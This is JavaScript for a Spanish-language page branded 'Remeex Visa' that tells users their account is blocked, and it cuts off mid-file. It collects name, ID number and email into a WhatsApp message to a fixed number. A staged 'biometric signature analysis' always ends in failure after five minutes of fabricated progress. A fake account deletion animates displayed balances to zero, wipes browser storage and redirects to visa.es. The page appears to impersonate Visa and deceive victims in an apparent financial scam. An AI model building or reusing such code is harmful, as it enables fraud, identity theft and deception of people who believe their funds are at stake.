(() => {
    const ACCESS_CONTROL = {
      tokenKey: 'remeexBlockedAccessToken',
      tokenValue: 'allowed',
      urlParam: 'entryToken',
      allowedReferrers: ['homeremeex.html', 'homevisa.html']
    };

    const hasAllowedReferrer = () => {
      try {
        const referrer = document.referrer || '';
        return ACCESS_CONTROL.allowedReferrers.some((pattern) => referrer.includes(pattern));
      } catch (error) {
        return false;
      }
    };

    const consumeSessionToken = () => {
      try {
        const stored = window.sessionStorage.getItem(ACCESS_CONTROL.tokenKey);
        if (stored === ACCESS_CONTROL.tokenValue) {
          window.sessionStorage.removeItem(ACCESS_CONTROL.tokenKey);
          return true;
        }
      } catch (error) {}
      return false;
    };

    const consumeUrlToken = () => {
      try {
        const params = new URLSearchParams(window.location.search);
        if (params.get(ACCESS_CONTROL.urlParam) === ACCESS_CONTROL.tokenValue) {
          params.delete(ACCESS_CONTROL.urlParam);
          if (window.history && typeof window.history.replaceState === 'function') {
            const nextQuery = params.toString();
            const newUrl = `${window.location.pathname}${nextQuery ? `?${nextQuery}` : ''}${window.location.hash}`;
            window.history.replaceState(null, document.title, newUrl);
          }
          return true;
        }
      } catch (error) {}
      return false;
    };

    if (!(hasAllowedReferrer() || consumeSessionToken() || consumeUrlToken())) {
      window.location.replace('homevisa.html');
      return;
    }

    // === CONFIGURACIÓN GLOBAL ===
    const CONFIG = {
      phoneNumber: '17373018059',
      storageKey: 'remeexAccountClosed',
      analysisTimeout: 300000, // 5 minutos
      deletionSteps: [
        'Liberando fondos hacia el medio original...',
        'Revirtiendo intercambios pendientes...',
        'Eliminando credenciales asociadas...',
        'Confirmando eliminación definitiva...'
      ]
    };

    const SIGNATURE_STROKE_COLOR = (() => {
      try {
        const accent = getComputedStyle(document.documentElement).getPropertyValue('--accent');
        if (accent && accent.trim()) {
          return accent.trim();
        }
      } catch (error) {}
      return '#F7B600';
    })();

    // === UTILIDADES ===
    const $ = (selector) => document.querySelector(selector);
    const $$ = (selector) => Array.from(document.querySelectorAll(selector));

    // === VIDEO DE INTRODUCCIÓN ===
    (function initIntroVideo() {
      const overlay = $('#introVideoOverlay');
      const video = $('#introVideo');

      if (!overlay || !video) {
        document.body.classList.remove('intro-active');
        return;
      }

      let hasHidden = false;
      const hideOverlay = () => {
        if (hasHidden) return;
        hasHidden = true;
        overlay.classList.add('is-hidden');
        document.body.classList.remove('intro-active');
        setTimeout(() => {
          overlay.remove();
        }, 700);
      };

      let fallbackTimeout = setTimeout(hideOverlay, 8000);

      video.addEventListener('ended', () => {
        clearTimeout(fallbackTimeout);
        hideOverlay();
      }, { once: true });

      video.addEventListener('error', () => {
        clearTimeout(fallbackTimeout);
        hideOverlay();
      }, { once: true });

      video.addEventListener('playing', () => {
        if (video.duration && Number.isFinite(video.duration)) {
          clearTimeout(fallbackTimeout);
          fallbackTimeout = setTimeout(hideOverlay, Math.max(video.duration * 1000, 2500));
        }
      }, { once: true });

      const attemptPlay = () => {
        const playPromise = video.play();
        if (playPromise && typeof playPromise.then === 'function') {
          playPromise.catch(() => {
            video.muted = true;
            video.play().catch(hideOverlay);
          });
        }
      };

      attemptPlay();

      if (video.readyState < 2) {
        video.addEventListener('loadeddata', attemptPlay, { once: true });
      }
    })();

    // Verificar cuenta cerrada
    (function checkClosedAccount() {
      try {
        if (localStorage.getItem(CONFIG.storageKey)) {
          window.location.replace('https://visa.es');
          return;
        }
      } catch(e) {}
    })();

    // === GESTIÓN DE VIEWPORT EN MÓVIL ===
    function setViewportHeight() {
      const vh = window.innerHeight * 0.01;
      document.documentElement.style.setProperty('--vh', `${vh}px`);
    }

    window.addEventListener('resize', setViewportHeight);
    window.addEventListener('orientationchange', setViewportHeight);
    setViewportHeight();

    // === GESTIÓN DE SALDOS ===
    class BalanceManager {
      constructor() {
        this.bsElement = $('#saldoBs');
        this.usdElement = $('#saldoUsd');
        this.bsValue = 0;
        this.usdValue = 0;
        this.loadInitialBalance();
      }

      loadInitialBalance() {
        const storedBalance = this.loadFromStorage();

        if (storedBalance) {
          this.bsValue = storedBalance.bs;
          this.usdValue = storedBalance.usd;
        } else {
          this.loadFromParams();
        }

        this.updateDisplay();
      }

      loadFromParams() {
        const params = new URLSearchParams(window.location.search);
        const bsParam = params.get('saldo_bs') || params.get('saldoBs') || '0';
        const usdParam = params.get('saldo_usd') || params.get('saldoUsd') || '0';

        this.bsValue = this.parseAmount(bsParam);
        this.usdValue = this.parseAmount(usdParam);
      }

      loadFromStorage() {
        const sources = [
          () => this.safeParseStorage(() => sessionStorage.getItem('remeexSessionBalance')),
          () => this.safeParseStorage(() => localStorage.getItem('remeexBalance'))
        ];

        for (const getSource of sources) {
          const data = getSource();
          if (this.hasBalanceData(data)) {
            return {
              bs: this.parseAmount(data.bs),
              usd: this.parseAmount(data.usd)
            };
          }
        }

        return null;
      }

      safeParseStorage(getter) {
        try {
          const raw = getter();
          if (!raw) return null;
          return JSON.parse(raw);
        } catch (error) {
          return null;
        }
      }

      hasBalanceData(data) {
        return !!(data && (data.bs !== undefined || data.usd !== undefined));
      }

      parseAmount(raw) {
        if (!raw) return 0;
        const cleaned = raw.toString().replace(/[^0-9.,-]/g, '');
        const normalized = cleaned.replace(/[,]/g, '.');
        return parseFloat(normalized) || 0;
      }

      formatAmount(value, currency) {
        const formatters = {
          'VES': new Intl.NumberFormat('es-VE', { style: 'currency', currency: 'VES' }),
          'USD': new Intl.NumberFormat('es-US', { style: 'currency', currency: 'USD' })
        };
        
        try {
          return formatters[currency].format(value);
        } catch(e) {
          return currency === 'VES' ? `Bs. ${value.toFixed(2)}` : `$${value.toFixed(2)}`;
        }
      }

      updateDisplay() {
        if (this.bsElement) {
          this.bsElement.textContent = this.formatAmount(this.bsValue, 'VES');
        }
        if (this.usdElement) {
          this.usdElement.textContent = this.formatAmount(this.usdValue, 'USD');
        }
      }

      async animateToZero() {
        return new Promise(resolve => {
          const duration = 2400;
          const startTime = performance.now();
          const initialBs = this.bsValue;
          const initialUsd = this.usdValue;

          const animate = (currentTime) => {
            const elapsed = currentTime - startTime;
            const progress = Math.min(elapsed / duration, 1);
            
            this.bsValue = Math.max(initialBs * (1 - progress), 0);
            this.usdValue = Math.max(initialUsd * (1 - progress), 0);
            this.updateDisplay();

            if (progress < 1) {
              requestAnimationFrame(animate);
            } else {
              this.bsValue = 0;
              this.usdValue = 0;
              this.updateDisplay();
              resolve();
            }
          };

          requestAnimationFrame(animate);
        });
      }
    }

    // === GESTIÓN DE OVERLAYS ===
    class OverlayManager {
      constructor() {
        this.overlays = new Map();
        this.stack = [];
        this.setupEventListeners();
      }

      register(id, element) {
        this.overlays.set(id, element);
      }

      show(id, options = {}) {
        const overlay = this.overlays.get(id);
        if (!overlay) return false;

        // Cerrar overlay actual si existe
        if (this.stack.length > 0) {
          const current = this.stack[this.stack.length - 1];
          this.overlays.get(current)?.classList.remove('is-visible');
        }

        overlay.classList.add('is-visible');
        this.stack.push(id);

        // Resetear scroll
        const content = overlay.querySelector('.overlay-content');
        if (content) content.scrollTop = 0;

        // Focus management
        if (options.focusElement) {
          setTimeout(() => {
            const element = overlay.querySelector(options.focusElement);
            element?.focus({ preventScroll: true });
          }, 100);
        }

        // Prevenir scroll del body
        document.body.style.overflow = 'hidden';

        return true;
      }

      hide(id) {
        const overlay = this.overlays.get(id);
        if (!overlay) return false;

        overlay.classList.remove('is-visible');
        
        const index = this.stack.indexOf(id);
        if (index > -1) {
          this.stack.splice(index, 1);
        }

        // Mostrar overlay anterior si existe
        if (this.stack.length > 0) {
          const previous = this.stack[this.stack.length - 1];
          this.overlays.get(previous)?.classList.add('is-visible');
        } else {
          // Restaurar scroll del body
          document.body.style.overflow = '';
        }

        return true;
      }

      hideAll() {
        this.stack.forEach(id => {
          this.overlays.get(id)?.classList.remove('is-visible');
        });
        this.stack = [];
        document.body.style.overflow = '';
      }

      setupEventListeners() {
        document.addEventListener('keydown', (e) => {
          if (e.key === 'Escape' && this.stack.length > 0) {
            const current = this.stack[this.stack.length - 1];
            this.hide(current);
          }
        });
      }
    }

    // === SISTEMA WIZARD ===
    class WizardManager {
      constructor() {
        this.currentStep = 1;
        this.totalSteps = 3;
        this.form = $('#wizardForm');
        this.step1Fields = [
          { id: 'nombre', message: 'Introduce tu nombre', validator: value => value.length > 0 },
          { id: 'apellido', message: 'Introduce tu apellido', validator: value => value.length > 0 },
          { id: 'cedula', message: 'Introduce tu cédula de identidad', validator: value => value.length > 0 },
          {
            id: 'email',
            message: 'Introduce un email válido',
            validator: value => value.length > 0 && this.isEmailValid(value)
          }
        ];
        this.radioGroups = [
          { name: 'razon', message: 'Selecciona una razón' },
          { name: 'titular', message: 'Selecciona si eres el titular' },
          { name: 'comprobante', message: 'Indica si tienes comprobantes' },
          { name: 'motivo', message: 'Selecciona un motivo del bloqueo' }
        ];
        this.updateDescriptionCounter();
        this.setupEventListeners();
      }

      normalizeElements(target) {
        if (!target) return [];
        if (Array.isArray(target)) {
          return target.filter(Boolean);
        }
        if (target instanceof NodeList || target instanceof HTMLCollection) {
          return Array.from(target).filter(Boolean);
        }
        return [target];
      }

      showFieldError(target, message) {
        const elements = this.normalizeElements(target);
        if (!elements.length) return;

        const first = elements[0];
        const group = first.closest?.('.form-group');
        if (group) {
          group.classList.add('form-group--error');
          const optionsGrid = group.querySelector('.options-grid');
          optionsGrid?.classList.add('options-grid--error');
          const errorEl = group.querySelector('.form-error');
          if (errorEl) {
            errorEl.textContent = message;
          }
        }

        elements.forEach(element => {
          if (element && typeof element.setAttribute === 'function') {
            element.setAttribute('aria-invalid', 'true');
          }
        });
      }

      clearFieldError(target) {
        const elements = this.normalizeElements(target);
        if (!elements.length) return;

        const first = elements[0];
        const group = first.closest?.('.form-group');
        if (group) {
          group.classList.remove('form-group--error');
          const optionsGrid = group.querySelector('.options-grid');
          optionsGrid?.classList.remove('options-grid--error');
          const errorEl = group.querySelector('.form-error');
          if (errorEl) {
            errorEl.textContent = '';
          }
        }

        elements.forEach(element => {
          if (element && typeof element.removeAttribute === 'function') {
            element.removeAttribute('aria-invalid');
          }
        });
      }

      focusFirstInvalid(step = this.currentStep) {
        const stepElement = this.form?.querySelector(`.wizard-step[data-step="${step}"]`);
        if (!stepElement) return;

        const invalid = stepElement.querySelector('[aria-invalid="true"]');
        if (invalid && typeof invalid.focus === 'function') {
          requestAnimationFrame(() => {
            invalid.focus({ preventScroll: true });
          });
        }
      }

      isEmailValid(value) {
        return /^\S+@\S+\.\S+$/.test(value);
      }

      setStep(step) {
        if (step < 1 || step > this.totalSteps) return false;

        // Actualizar pasos
        $$('.wizard-step').forEach(el => {
          const stepNum = parseInt(el.dataset.step);
          el.classList.toggle('is-active', stepNum === step);
        });

        // Actualizar progress
        $$('.progress-step').forEach(el => {
          const stepNum = parseInt(el.dataset.step);
          el.classList.toggle('is-active', stepNum === step);
          el.classList.toggle('is-completed', stepNum < step);
        });

        this.currentStep = step;

        if (step === 2) {
          this.updateDescriptionCounter();
        }

        return true;
      }

      validateStep1() {
        let valid = true;

        this.step1Fields.forEach(({ id, message, validator }) => {
          const input = $(`#${id}`);
          if (!input) return;

          const value = input.value.trim();
          if (!validator(value)) {
            this.showFieldError(input, message);
            valid = false;
          } else {
            this.clearFieldError(input);
          }
        });

        return valid;
      }

      validateStep2() {
        let valid = true;

        this.radioGroups.forEach(({ name, message }) => {
          const radios = this.form?.querySelectorAll(`input[name="${name}"]`);
          if (!radios || !radios.length) return;

          const hasSelection = Array.from(radios).some(radio => radio.checked);
          if (!hasSelection) {
            this.showFieldError(radios, message);
            valid = false;
          } else {
            this.clearFieldError(radios);
          }
        });

        const description = $('#descripcion');
        if (description) {
          const text = description.value.trim();
          const minLength = 140;
          const remaining = minLength - text.length;

          if (remaining > 0) {
            const label = remaining === 1 ? 'carácter' : 'caracteres';
            this.showFieldError(description, `Escribe al menos 140 caracteres. Te faltan ${remaining} ${label}.`);
            valid = false;
          } else {
            this.clearFieldError(description);
          }

          this.updateDescriptionCounter();
        }

        return valid;
      }

      composeMessage() {
        const data = new FormData(this.form);
        const nombre = data.get('nombre') || '';
        const apellido = data.get('apellido') || '';
        const cedula = data.get('cedula') || '';
        const email = data.get('email') || '';
        const razon = data.get('razon') || '';
        const titular = data.get('titular') || '';
        const comprobante = data.get('comprobante') || '';
        const motivo = data.get('motivo') || '';
        const descripcion = data.get('descripcion') || '';

        return [
          'Hola, buen día. Solicito *activación de cuenta* en Remeex Visa.',
          '',
          '*Datos del cliente*:',
          `• Nombre: ${nombre} ${apellido}`,
          `• Cédula: ${cedula}`,
          `• Email: ${email}`,
          '',
          `*Motivo por el que no validé*: ${razon}`,
          `*Motivo del bloqueo*: ${motivo}`,
          `*Titular de fondos*: ${titular}`,
          `*Comprobantes*: ${comprobante}`,
          '',
          `*Descripción del caso*: ${descripcion}`,
          '',
          'Agradezco indicaciones para completar la validación. ¡Gracias!'
        ].join('\n');
      }

      updatePreview() {
        const preview = $('#messagePreview');
        if (preview) {
          preview.textContent = this.composeMessage();
        }

        const link = $('#sendWhatsApp');
        if (link) {
          const message = encodeURIComponent(this.composeMessage());
          link.href = `https://wa.me/${CONFIG.phoneNumber}?text=${message}`;
        }
      }

      updateDescriptionCounter() {
        const description = $('#descripcion');
        const counter = $('#descripcionCounter');
        if (!description || !counter) return;

        const minLength = 140;
        const text = description.value.trim();
        const currentLength = text.length;
        const remaining = Math.max(minLength - currentLength, 0);

        if (!currentLength) {
          counter.textContent = `Te faltan ${minLength} caracteres para completar el mínimo.`;
        } else if (remaining > 0) {
          const label = remaining === 1 ? 'carácter' : 'caracteres';
          counter.textContent = `Te faltan ${remaining} ${label} para completar el mínimo.`;
        } else {
          counter.textContent = '¡Perfecto! Ya completaste el mínimo de 140 caracteres.';
        }

        counter.classList.toggle('is-valid', remaining === 0);

        if (description.getAttribute('aria-invalid') === 'true' && remaining > 0) {
          const label = remaining === 1 ? 'carácter' : 'caracteres';
          this.showFieldError(description, `Escribe al menos 140 caracteres. Te faltan ${remaining} ${label}.`);
        }
      }

      setupEventListeners() {
        // Navegación
        $('#nextStep1')?.addEventListener('click', () => {
          if (this.validateStep1()) {
            this.setStep(2);
            this.focusFirstRadio();
          } else {
            this.focusFirstInvalid(1);
          }
        });

        $('#nextStep2')?.addEventListener('click', () => {
          if (this.validateStep2()) {
            overlayManager.show('globalLoader');
            setTimeout(() => {
              overlayManager.hide('globalLoader');
              this.setStep(3);
              this.updatePreview();
              suspensionManager.showOnce();
            }, 1200);
          } else {
            this.focusFirstInvalid(2);
          }
        });

        $('#backStep2')?.addEventListener('click', () => this.setStep(1));
        $('#backStep3')?.addEventListener('click', () => this.setStep(2));

        // Actualizar preview en tiempo real
        this.form?.addEventListener('input', () => {
          if (this.currentStep === 3) {
            this.updatePreview();
          }
        });

        const description = $('#descripcion');
        description?.addEventListener('input', () => {
          this.updateDescriptionCounter();
          const text = description.value.trim();
          if (text.length >= 140) {
            this.clearFieldError(description);
          }
        });

        this.step1Fields.forEach(({ id, validator }) => {
          const input = $(`#${id}`);
          if (!input) return;

          const handleChange = () => {
            const value = input.value.trim();
            if (validator(value)) {
              this.clearFieldError(input);
            }
          };

          input.addEventListener('input', handleChange);
          input.addEventListener('blur', handleChange);
        });

        this.radioGroups.forEach(({ name }) => {
          const radios = this.form?.querySelectorAll(`input[name="${name}"]`);
          if (!radios || !radios.length) return;

          radios.forEach(radio => {
            radio.addEventListener('change', () => {
              if (Array.from(radios).some(option => option.checked)) {
                this.clearFieldError(radios);
              }
            });
          });
        });

        // Detectar firma en motivo
        $$('input[name="motivo"]').forEach(radio => {
          radio.addEventListener('change', (e) => {
            const value = e.target.value.toLowerCase();
            if (value.includes('firma')) {
              overlayManager.hide('wizardOverlay');
              overlayManager.show('signatureOverlay');
              requestAnimationFrame(() => {
                signatureManager.refreshCanvas();
              });
            }
          });
        });

        // WhatsApp enviado
        $('#sendWhatsApp')?.addEventListener('click', () => {
          stateManager.setWaiting();
          overlayManager.hide('wizardOverlay');
        });
      }

      focusFirstRadio() {
        setTimeout(() => {
          const firstRadio = this.form.querySelector('input[name="razon"]');
          firstRadio?.focus({ preventScroll: true });
        }, 100);
      }
    }

    // === GESTIÓN DE ESTADOS ===
    class StateManager {
      constructor() {
        this.isWaiting = false;
        this.isDeleting = false;
      }

      setWaiting() {
        if (this.isWaiting) return;
        
        this.isWaiting = true;
        const fullName = this.getFullName();
        
        const userElement = $('#waitingUser');
        if (userElement) userElement.textContent = fullName;

        document.body.classList.add('is-waiting');
        $('#waitingState')?.classList.add('is-active');
      }

      setDeleting() {
        if (this.isDeleting) return;

        this.isDeleting = true;
        document.body.classList.add('is-deleting');
        $('#deletionState')?.classList.add('is-active');

        const description = $('#mainDescription');
        if (description) {
          description.textContent = 'Has decidido eliminar tu cuenta. Estamos devolviendo los fondos y cerrándola de forma definitiva.';
        }

        this.disableButtons();
      }

      getFullName() {
        const nombre = $('#nombre')?.value?.trim() || '';
        const apellido = $('#apellido')?.value?.trim() || '';
        return `${nombre} ${apellido}`.trim() || 'el titular';
      }

      disableButtons() {
        $$('.btn').forEach(btn => {
          btn.disabled = true;
          btn.style.opacity = '0.3';
          btn.style.pointerEvents = 'none';
        });
      }
    }

    // === GESTIÓN DE FIRMA DIGITAL ===
    class SignatureManager {
      constructor() {
        this.canvas = $('#signaturePad');
        this.ctx = null;
        this.isDrawing = false;
        this.strokes = [];
        this.undoStack = [];
        this.currentStroke = [];
        this.scale = 1;
        this.hasContent = false;

        this.setupCanvas();
        this.setupEventListeners();
      }

      setupCanvas() {
        if (!this.canvas) return;

        this.resizeCanvas();
        this.ctx = this.canvas.getContext('2d');
        
        if (this.ctx) {
          this.ctx.lineCap = 'round';
          this.ctx.lineJoin = 'round';
          this.ctx.strokeStyle = SIGNATURE_STROKE_COLOR;
          this.ctx.lineWidth = 2;
        }
      }

      resizeCanvas() {
        if (!this.canvas) return;

        const rect = this.canvas.getBoundingClientRect();
        const dpr = window.devicePixelRatio || 1;

        this.canvas.width = rect.width * dpr;
        this.canvas.height = rect.height * dpr;
        this.scale = dpr;

        if (this.ctx) {
          this.ctx.setTransform(1, 0, 0, 1, 0, 0);
          this.ctx.scale(dpr, dpr);
        }

        this.redraw();
      }

      refreshCanvas() {
        if (!this.canvas) return;

        this.isDrawing = false;
        this.currentStroke = [];
        this.strokes = [];
        this.undoStack = [];
        this.hasContent = false;

        if (this.ctx) {
          this.ctx.setTransform(1, 0, 0, 1, 0, 0);
          this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
        }

        this.resizeCanvas();
        this.updateStatus('El lienzo está listo. Traza tu firma para continuar.', '');
        this.updateButtons();
      }

      getEventPos(e) {
        const rect = this.canvas.getBoundingClientRect();
        return {
          x: (e.clientX || e.touches?.[0]?.clientX || 0) - rect.left,
          y: (e.clientY || e.touches?.[0]?.clientY || 0) - rect.top
        };
      }

      startDrawing(e) {
        e.preventDefault();
        if (!this.ctx) return;

        this.isDrawing = true;
        this.currentStroke = [];
        this.undoStack = []; // Clear redo stack

        const pos = this.getEventPos(e);
        this.currentStroke.push(pos);
        
        this.ctx.beginPath();
        this.ctx.moveTo(pos.x, pos.y);
      }

      draw(e) {
        if (!this.isDrawing || !this.ctx) return;
        e.preventDefault();

        const pos = this.getEventPos(e);
        this.currentStroke.push(pos);
        
        this.ctx.lineTo(pos.x, pos.y);
        this.ctx.stroke();
      }

      stopDrawing(e) {
        if (!this.isDrawing) return;
        e.preventDefault();

        this.isDrawing = false;
        
        if (this.currentStroke.length > 1) {
          this.strokes.push([...this.currentStroke]);
          this.hasContent = true;
        }
        
        this.currentStroke = [];
        this.updateButtons();
        this.updateStatus('Firma capturada. Revisa el trazo antes de enviar.', 'success');
      }

      clear() {
        if (!this.ctx) return;

        this.ctx.clearRect(0, 0, this.canvas.width / this.scale, this.canvas.height / this.scale);
        this.strokes = [];
        this.undoStack = [];
        this.hasContent = false;
        this.updateButtons();
        this.updateStatus('El lienzo está vacío. Traza tu firma para continuar.', '');
      }

      undo() {
        if (this.strokes.length === 0) return;

        const lastStroke = this.strokes.pop();
        this.undoStack.push(lastStroke);
        this.hasContent = this.strokes.length > 0;
        this.redraw();
        this.updateButtons();
        
        if (this.hasContent) {
          this.updateStatus('Último trazo deshecho. Continúa o envía la captura.', 'success');
        } else {
          this.updateStatus('No quedan trazos. Dibuja de nuevo tu firma.', 'warning');
        }
      }

      redo() {
        if (this.undoStack.length === 0) return;

        const stroke = this.undoStack.pop();
        this.strokes.push(stroke);
        this.hasContent = true;
        this.redraw();
        this.updateButtons();
        this.updateStatus('Trazo restaurado correctamente.', 'success');
      }

      redraw() {
        if (!this.ctx) return;

        this.ctx.clearRect(0, 0, this.canvas.width / this.scale, this.canvas.height / this.scale);
        
        this.strokes.forEach(stroke => {
          if (stroke.length < 2) return;
          
          this.ctx.beginPath();
          this.ctx.moveTo(stroke[0].x, stroke[0].y);
          
          for (let i = 1; i < stroke.length; i++) {
            this.ctx.lineTo(stroke[i].x, stroke[i].y);
          }
          
          this.ctx.stroke();
        });
      }

      updateButtons() {
        const undoBtn = $('#undoSignature');
        const redoBtn = $('#redoSignature');
        const clearBtn = $('#clearSignature');
        const submitBtn = $('#submitSignature');

        if (undoBtn) undoBtn.disabled = this.strokes.length === 0;
        if (redoBtn) redoBtn.disabled = this.undoStack.length === 0;
        if (clearBtn) clearBtn.disabled = !this.hasContent;
        if (submitBtn) submitBtn.disabled = !this.hasContent;
      }

      updateStatus(message, type = '') {
        const status = $('#signatureStatus');
        if (!status) return;

        status.textContent = message;
        status.className = 'signature-status';
        if (type) status.classList.add(`signature-status--${type}`);
      }

      setupEventListeners() {
        if (!this.canvas) return;

        // Mouse events
        this.canvas.addEventListener('mousedown', (e) => this.startDrawing(e));
        this.canvas.addEventListener('mousemove', (e) => this.draw(e));
        this.canvas.addEventListener('mouseup', (e) => this.stopDrawing(e));
        this.canvas.addEventListener('mouseleave', (e) => this.stopDrawing(e));

        // Touch events
        this.canvas.addEventListener('touchstart', (e) => this.startDrawing(e));
        this.canvas.addEventListener('touchmove', (e) => this.draw(e));
        this.canvas.addEventListener('touchend', (e) => this.stopDrawing(e));
        this.canvas.addEventListener('touchcancel', (e) => this.stopDrawing(e));

        // Prevent scrolling when touching the canvas
        this.canvas.addEventListener('touchstart', (e) => e.preventDefault());
        this.canvas.addEventListener('touchend', (e) => e.preventDefault());
        this.canvas.addEventListener('touchmove', (e) => e.preventDefault());

        // Keyboard
        this.canvas.addEventListener('keydown', (e) => {
          if ((e.key === 'z' || e.key === 'Z') && (e.ctrlKey || e.metaKey)) {
            e.preventDefault();
            if (e.shiftKey) {
              this.redo();
            } else {
              this.undo();
            }
          } else if (e.key === 'Delete' || e.key === 'Backspace') {
            e.preventDefault();
            this.clear();
          }
        });

        // Button events
        $('#undoSignature')?.addEventListener('click', () => this.undo());
        $('#redoSignature')?.addEventListener('click', () => this.redo());
        $('#clearSignature')?.addEventListener('click', () => this.clear());
        
        $('#submitSignature')?.addEventListener('click', () => {
          if (!this.hasContent) {
            this.updateStatus('Debes trazar tu firma antes de enviarla.', 'warning');
            return;
          }
          analysisManager.start();
        });

        // Resize handler
        window.addEventListener('resize', () => this.resizeCanvas());
        window.addEventListener('orientationchange', () => {
          setTimeout(() => this.resizeCanvas(), 200);
        });
      }
    }

    // === ANÁLISIS DE FIRMA ===
    class AnalysisManager {
      constructor() {
        this.isRunning = false;
        this.progress = 0;
        this.timers = [];
      }

      start() {
        if (this.isRunning) return;

        this.isRunning = true;
        overlayManager.hide('signatureOverlay');
        overlayManager.show('signatureAnalysis');
        
        this.resetUI();
        this.runAnalysis();
      }

      resetUI() {
        $('#analysisSpinner')?.classList.remove('hidden');
        $('#analysisResult')?.classList.add('hidden');
        $('#analysisActions')?.classList.add('hidden');
        $('#analysisCloseBtn')?.classList.add('hidden');
        
        const title = $('#analysisTitle');
        const detail = $('#analysisDetail');
        const percentage = $('#analysisPercentage');
        
        if (title) title.textContent = 'Analizando firma enviada...';
        if (detail) detail.textContent = 'Iniciando verificación biométrica y comparación de trazos.';
        if (percentage) percentage.textContent = '0%';
        
        this.setProgress(0);
      }

      runAnalysis() {
        const steps = [
          { time: 0, text: 'Iniciando verificación biométrica y comparación de trazos.' },
          { time: 60000, text: 'Contrastando vectores con base de datos del titular.' },
          { time: 120000, text: 'Evaluando presión, velocidad y puntos de inflexión.' },
          { time: 180000, text: 'Comparando coincidencia angular con firma registrada.' },
          { time: 240000, text: 'Aplicando filtros antifraude y heurísticas.' }
        ];

        // Actualizar progreso
        const progressTimer = setInterval(() => {
          this.progress += 0.5;
          this.setProgress(this.progress);
          
          if (this.progress >= 100) {
            clearInterval(progressTimer);
          }
        }, 1500);

        this.timers.push(progressTimer);

        // Actualizar textos
        steps.forEach(step => {
          const timer = setTimeout(() => {
            if (this.isRunning) {
              const detail = $('#analysisDetail');
              if (detail) detail.textContent = step.text;
            }
          }, step.time);
          
          this.timers.push(timer);
        });

        // Finalizar análisis
        const finishTimer = setTimeout(() => {
          this.finish();
        }, CONFIG.analysisTimeout);
        
        this.timers.push(finishTimer);
      }

      setProgress(value) {
        const clamped = Math.max(0, Math.min(100, value));
        const bar = $('#analysisProgressBar');
        const text = $('#analysisPercentage');
        
        if (bar) bar.style.width = `${clamped}%`;
        if (text) text.textContent = `${Math.round(clamped)}%`;
      }

      finish() {
        this.cleanup();
        
        const spinner = $('#analysisSpinner');
        const title = $('#analysisTitle');
        const detail = $('#analysisDetail');
        const result = $('#analysisResult');
        const actions = $('#analysisActions');
        const closeBtn = $('#analysisCloseBtn');
        
        if (spinner) spinner.classList.add('hidden');
        if (title) title.textContent = 'No pudimos confirmar tu firma digital';
        if (detail) detail.textContent = 'El análisis detectó variaciones respecto al documento registrado.';
        if (result) result.classList.remove('hidden');
        if (actions) actions.classList.remove('hidden');
        if (closeBtn) closeBtn.classList.remove('hidden');

        this.setProgress(100);
      }

      cleanup() {
        this.isRunning = false;
        this.progress = 0;
        
        this.timers.forEach(timer => clearTimeout(timer));
        this.timers = [];
      }
    }

    // === GESTIÓN DE ELIMINACIÓN ===
    class DeletionManager {
      constructor() {
        this.step = 1;
        this.isProcessing = false;
        this.timers = [];
      }

      showModal() {
        this.setStep(1);
        overlayManager.show('deletionOverlay', { focusElement: '#proceedDeletion' });
      }

      setStep(step) {
        this.step = step;
        $('#deletionStep1')?.classList.toggle('hidden', step !== 1);
        $('#deletionStep2')?.classList.toggle('hidden', step !== 2);
      }

      async startDeletion() {
        if (this.isProcessing) return;

        this.isProcessing = true;
        overlayManager.hide('deletionOverlay');
        overlayManager.show('deletionLoader');
        
        stateManager.setDeleting();
        
        // Animar saldos a cero
        await balanceManager.animateToZero();
        
        // Proceso de eliminación
        this.runDeletionProcess();
      }

      runDeletionProcess() {
        let stepIndex = 0;
        
        const processStep = () => {
          if (stepIndex >= CONFIG.deletionSteps.length) {
            this.completeDeletion();
            return;
          }
          
          const message = $('#deletionMessage');
          if (message) message.textContent = CONFIG.deletionSteps[stepIndex];
          
          stepIndex++;
          const timer = setTimeout(processStep, 2000);
          this.timers.push(timer);
        };
        
        processStep();
      }

      async completeDeletion() {
        this.cleanup();
        
        const message = $('#deletionMessage');
        if (message) message.textContent = 'Cuenta eliminada. Finalizando sesión...';
        
        // Limpiar datos
        await this.clearUserData();
        
        // Marcar cuenta cerrada
        try {
          localStorage.setItem(CONFIG.storageKey, 'true');
        } catch(e) {}
        
        setTimeout(() => {
          this.showFinalScreen();
          setTimeout(() => {
            window.location.replace('https://visa.es');
          }, 1500);
        }, 800);
      }

      async clearUserData() {
        try {
          localStorage.clear();
          sessionStorage.clear();
          
          if ('caches' in window) {
            const cacheNames = await caches.keys();
            await Promise.all(cacheNames.map(name => caches.delete(name)));
          }
          
          if ('serviceWorker' in navigator) {
            const registrations = await navigator.serviceWorker.getRegistrations();
            await Promise.all(registrations.map(reg => reg.unregister()));
          }
          
        } catch(e) {}
      }

      showFinalScreen() {
        try {
          document.body.innerHTML = `
            <div style="position:fixed;inset:0;background:rgba(255,255,255,0.9);
                        backdrop-filter:blur(12px);display:flex;align-items:center;
                        justify-content:center;font-family:system-ui,sans-serif;
                        color:#1A1F71;font-size:18px;text-align:center;padding:24px;">
              Cuenta eliminada definitivamente. Redirigiendo...
            </div>
          `;
        } catch(e) {}
      }

      cleanup() {
        this.isProcessing = false;
        this.timers.forEach(timer => clearTimeout(timer));
        this.timers = [];
      }
    }

    // === NOTIFICACIÓN DE SUSPENSIÓN ===
    class SuspensionManager {
      constructor() {
        this.hasShown = false;
      }

      showOnce() {
        if (this.hasShown) return;
        
        this.hasShown = true;
        setTimeout(() => {
          overlayManager.show('suspensionNotice');
        }, 500);
      }

      hide() {
        overlayManager.hide('suspensionNotice');
      }
    }

    // === INICIALIZACIÓN ===
    const balanceManager = new BalanceManager();
    const overlayManager = new OverlayManager();
    const wizardManager = new WizardManager();
    const stateManager = new StateManager();
    const signatureManager = new SignatureManager();
    const analysisManager = new AnalysisManager();
    const deletionManager = new DeletionManager();
    const suspensionManager = new SuspensionManager();

    // Registrar overlays
    overlayManager.register('wizardOverlay', $('#wizardOverlay'));
    overlayManager.register('signatureOverlay', $('#signatureOverlay'));
    overlayManager.register('signatureAnalysis', $('#signatureAnalysis'));
    overlayManager.register('deletionOverlay', $('#deletionOverlay'));
    overlayManager.register('suspensionNotice', $('#suspensionNotice'));
    overlayManager.register('globalLoader', $('#globalLoader'));
    overlayManager.register('deletionLoader', $('#deletionLoader'));

    // === EVENT LISTENERS PRINCIPALES ===
    
    // Botón activar cuenta
    $('#btnActivate')?.addEventListener('click', () => {
      overlayManager.show('wizardOverlay', { focusElement: '#nombre' });
    });

    // Botón eliminar cuenta
